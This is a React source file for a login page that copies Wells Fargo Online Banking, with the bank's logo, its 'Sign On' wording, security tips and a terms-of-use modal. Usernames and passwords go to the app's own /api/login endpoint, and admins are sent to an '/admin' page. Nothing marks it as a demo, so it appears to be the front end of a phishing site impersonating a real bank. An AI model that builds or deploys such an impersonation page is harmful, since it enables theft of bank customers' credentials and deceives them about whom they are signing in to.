import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { loginSchema, type LoginFormData } from '@shared/schema';
import { useLocation } from 'wouter';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { saveToSession } from '@/lib/utils';
import { 
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { AlertBanner } from '@/components/AlertBanner';
import { Header } from '@/components/Header';
import { Footer } from '@/components/Footer';
import { WellsFargoLogo } from '@/components/WellsFargoSvg';

export default function Login() {
  const { toast } = useToast();
  const [, navigate] = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [showTermsModal, setShowTermsModal] = useState(false);

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: '',
      password: '',
      rememberMe: false,
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    if (!termsAccepted) {
      setShowTermsModal(true);
      return;
    }

    try {
      setIsLoading(true);
      
      const response = await apiRequest('POST', '/api/login', data);
      const result = await response.json();
      
      // Save user info and login details to session
      saveToSession('user', result.user);
      saveToSession('loginTime', result.loginTime);
      saveToSession('ipAddress', result.ip);
      
      // Show success toast
      toast({
        title: "Login Successful",
        description: "You've successfully logged in to your account.",
        variant: "default",
      });
      
      // Redirect based on admin status
      if (result.user.isAdmin) {
        navigate('/admin');
      } else {
        navigate('/profile');
      }
    } catch (error) {
      console.error('Login error:', error);
      
      // Show error toast
      toast({
        title: "Login Failed",
        description: "Invalid username or password. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const acceptTerms = () => {
    setTermsAccepted(true);
    setShowTermsModal(false);
    
    // Submit the form after accepting terms
    form.handleSubmit(onSubmit)();
  };

  return (
    <div className="flex flex-col min-h-screen">
      <AlertBanner message="This site is protected by encryption. Please sign on safely." />
      <Header />
      
      <main className="flex-grow">
        <div className="container mx-auto px-4 py-12">
          <div className="max-w-md mx-auto bg-white shadow-md rounded-lg overflow-hidden">
            <div className="p-6">
              <div className="flex justify-center mb-6">
                <WellsFargoLogo className="h-8" />
              </div>
              
              <h1 className="text-2xl font-bold mb-6 text-center">Sign On to Online Banking</h1>
              
              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                  <FormField
                    control={form.control}
                    name="username"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Username</FormLabel>
                        <FormControl>
                          <Input placeholder="Enter username" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <FormField
                    control={form.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Password</FormLabel>
                        <FormControl>
                          <Input type="password" placeholder="Enter password" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <FormField
                    control={form.control}
                    name="rememberMe"
                    render={({ field }) => (
                      <FormItem className="flex flex-row items-start space-x-3 space-y-0">
                        <FormControl>
                          <Checkbox
                            checked={field.value}
                            onCheckedChange={field.onChange}
                          />
                        </FormControl>
                        <div className="space-y-1 leading-none">
                          <FormLabel>Remember Username</FormLabel>
                        </div>
                      </FormItem>
                    )}
                  />
                  
                  <Button 
                    type="submit" 
                    className="w-full bg-wf-red hover:bg-wf-dark-red"
                    disabled={isLoading}
                  >
                    {isLoading ? "Signing in..." : "Sign On"}
                  </Button>
                </form>
              </Form>
              
              <div className="mt-6">
                <p className="text-sm text-center">
                  <a href="#" className="text-wf-red hover:text-wf-dark-red">Forgot Username or Password?</a>
                </p>
                <p className="text-sm text-center mt-3">
                  <a href="#" className="text-wf-red hover:text-wf-dark-red">Enroll Now</a>
                </p>
              </div>
            </div>
            
            <div className="bg-gray-100 p-6">
              <h2 className="font-semibold mb-3">Security Center</h2>
              <ul className="space-y-2 text-sm">
                <li className="flex items-start">
                  <span className="material-symbols-outlined text-wf-red mr-2 flex-shrink-0">security</span>
                  <p>Wells Fargo will never ask for your personal information by email</p>
                </li>
                <li className="flex items-start">
                  <span className="material-symbols-outlined text-wf-red mr-2 flex-shrink-0">password</span>
                  <p>Create strong, unique passwords and change them regularly</p>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
      
      {/* Terms Acceptance Modal */}
      {showTermsModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg max-w-md w-full p-6">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-bold">Terms and Conditions</h3>
              <button className="text-gray-500 hover:text-gray-700" onClick={() => setShowTermsModal(false)}>
                <span className="material-symbols-outlined">close</span>
              </button>
            </div>
            <div className="mb-6 max-h-60 overflow-y-auto">
              <p className="mb-4">By signing on to Wells Fargo Online Banking, you agree to the following:</p>
              <ul className="list-disc pl-5 space-y-2">
                <li>You are the authorized user of this account</li>
                <li>You agree to Wells Fargo's Online Access Agreement</li>
                <li>You acknowledge that your activities may be monitored for security purposes</li>
                <li>You will keep your login information secure and confidential</li>
                <li>You will sign off when finished with your banking session</li>
              </ul>
            </div>
            <div className="flex justify-end space-x-3">
              <button 
                className="px-4 py-2 border border-gray-300 rounded text-gray-700 hover:bg-gray-100"
                onClick={() => setShowTermsModal(false)}
              >
                Decline
              </button>
              <button 
                className="px-4 py-2 bg-wf-red text-white rounded hover:bg-wf-dark-red"
                onClick={acceptTerms}
              >
                Accept & Continue
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
